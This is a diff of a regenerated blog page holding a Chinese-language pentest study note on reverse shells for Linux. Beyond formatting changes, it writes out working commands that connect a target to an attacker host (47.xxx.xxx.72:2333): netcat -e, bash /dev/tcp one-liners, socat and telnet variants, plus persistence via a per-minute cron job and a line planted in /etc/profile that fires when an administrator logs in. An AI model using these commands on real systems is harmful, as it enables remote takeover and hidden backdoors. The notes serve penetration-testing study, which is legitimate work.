@@ -6,14 +6,10 @@
     <meta charset="utf-8">
     <meta name="keywords" content="反弹Shell, 学习记录">
     <meta name="description" content="
-
 反弹Shell总结
 
-
-
-
 前言在渗透测试实战中，我们经常会遇见Linux系统环境，而让Linux主机反弹个Shell是再常见不过的事情了。
-反弹Shell，就是攻击机监听在某个TCP&amp;#x2F;UDP端口作为服务器端，目标机主机发起请">
+反弹Shell，就是攻击机监听在某个TCP/UDP端口作为服务器端，目标机主机发起请求到攻击机监听的端">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -495,14 +491,10 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <!--toc-->
-
 <p>反弹Shell总结</p>
 <span id="more"></span>
-
-
-
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试实战中，我们经常会遇见Linux系统环境，而让Linux主机反弹个Shell是再常见不过的事情了。</p>
-<p>反弹Shell，就是攻击机监听在某个TCP&#x2F;UDP端口作为服务器端，目标机主机发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>
+<p>反弹Shell，就是攻击机监听在某个TCP/UDP端口作为服务器端，目标机主机发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>
 <h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h2><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p>
 <h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h2><p>反向连接就是目标机主动连接攻击机。那么为什么要用反弹Shell呢？<br>反弹Shell通常适用与如下几种情况：<br>1.目标机因防火墙受限，目标机器只能发送请求，不能接受请求。</p>
 <p>2.目标机端口被占用。</p>
@@ -518,7 +510,6 @@ tar -xvzf netcat-0.7.1.tar.gz
 .&#x2F;configure
 make &amp;&amp; make install
 make clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>安装完原生版本的netcat工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p>
 <h3 id="攻击机开启本地监听"><a href="#攻击机开启本地监听：" class="headerlink" title="攻击机开启本地监听："></a>攻击机开启本地监听：</h3><p><code>netcat -lvvp 2333</code></p>
 <p><code>-l</code>表示以监听模式运行</p>
@@ -527,13 +518,13 @@ make clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span>
 <p><code># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</code></p>
 <p>执行效果如下：</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205828-9929e0ec-a433-1.png" alt="img"></p>
-<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="利用bash反弹shell"><a href="#利用Bash反弹Shell" class="headerlink" title="利用Bash反弹Shell"></a>利用Bash反弹Shell</h3><p>链接作者认为反弹Shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：</p>
+<h3 id><a href="#" class="headerlink" title=" "></a> </h3><h3 id="利用bash反弹shell"><a href="#利用Bash反弹Shell" class="headerlink" title="利用Bash反弹Shell"></a>利用Bash反弹Shell</h3><p>链接作者认为反弹Shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1
 或
 bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1&quot;
 # bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机IP&#x2F;攻击机端口 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>以下是针对Bash反弹一句话进行了拆分说明：</p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -541,7 +532,8 @@ bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 
 <th>命令详解</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>bash -i</td>
 <td>产生一个bash交互环境。</td>
 </tr>
@@ -550,14 +542,16 @@ bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 
 <td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td>
 </tr>
 <tr>
-<td>&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td>
+<td>/dev/tcp/47.xxx.xxx.72/2333</td>
 <td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
 </tr>
 <tr>
 <td>0&gt;&amp;1</td>
 <td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <blockquote>
 <p>Bash反弹一句完整的解读过程就是：</p>
 <p>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p>
@@ -581,13 +575,9 @@ bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 
 <pre class="line-numbers language-none"><code class="language-none">*&#x2F;1  *  *  *  *   &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1
 
 #每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h3 id="将反弹shell的命令写入x2fetcx2fprofile文件"><a href="#将反弹shell的命令写入-x2F-etc-x2F-profile文件" class="headerlink" title="将反弹shell的命令写入&#x2F;etc&#x2F;profile文件"></a>将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</h3><p>将以下反弹shell的命令写入<code>/etc/profile</code>文件中，<code>/etc/profile</code>中的内容会在用户打开bash窗口时执行。</p>
+<h3 id="将反弹shell的命令写入etcprofile文件"><a href="#将反弹shell的命令写入-etc-profile文件" class="headerlink" title="将反弹shell的命令写入/etc/profile文件"></a>将反弹shell的命令写入/etc/profile文件</h3><p>将以下反弹shell的命令写入<code>/etc/profile</code>文件中，<code>/etc/profile</code>中的内容会在用户打开bash窗口时执行。</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1 &amp;
 # 最后面那个&amp;为的是防止管理员无法输入命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell：</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205829-99d50ed6-a433-1.png" alt="img"></p>
 <h3 id="利用socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用Socat反弹shell</h3><p>Socat是Linux下一个多功能的网络工具，名字来由是“Socker CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看作netcat的加强版，事实上也的确如此。</p>
@@ -598,13 +588,11 @@ bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 
 <p>也可以去官网下载源码包：<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat">http://www.dest-unreach.org/socat</a></p>
 <h4 id="攻击机开启本地监听"><a href="#攻击机开启本地监听：-1" class="headerlink" title="攻击机开启本地监听："></a>攻击机开启本地监听：</h4><p><code>socat TCP_LISTEN:2333</code> 或<code>nc -lvvp 2333</code></p>
 <h4 id="目标机主动连接攻击机"><a href="#目标机主动连接攻击机：-1" class="headerlink" title="目标机主动连接攻击机："></a>目标机主动连接攻击机：</h4><pre class="line-numbers language-none"><code class="language-none">socat tcp-connect:47.xxx.xxx.72:2333 exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>执行效果如下：</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205829-9a0139ac-a433-1.png" alt="img"></p>
-<h3 id="利用telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h3><p>当nc和&#x2F;dev&#x2F;tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。</p>
+<h3 id="利用telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h3><p>当nc和/dev/tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。</p>
 <h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><h5 id="攻击机开启本地监听"><a href="#攻击机开启本地监听：-2" class="headerlink" title="攻击机开启本地监听："></a>攻击机开启本地监听：</h5><p><code>nc -lvvp 2333</code></p>
 <h5 id="目标机主动连接攻击机"><a href="#目标机主动连接攻击机：-2" class="headerlink" title="目标机主动连接攻击机："></a>目标机主动连接攻击机：</h5><pre class="line-numbers language-none"><code class="language-none">mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | &#x2F;bin&#x2F;bash 1&gt;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>执行效果如下：</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210423205830-9a3a5fca-a433-1.png" alt="img"></p>
 <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9488">反弹Shell，看这一篇就够了</a></p>
@@ -907,7 +895,6 @@ bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 
                     <div class="summary block-with-text">
                         
                             
-
 服务器端请求伪造记录
                         
                     </div>
@@ -986,7 +973,7 @@ bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -998,7 +985,7 @@ bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1127,7 +1114,7 @@ bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
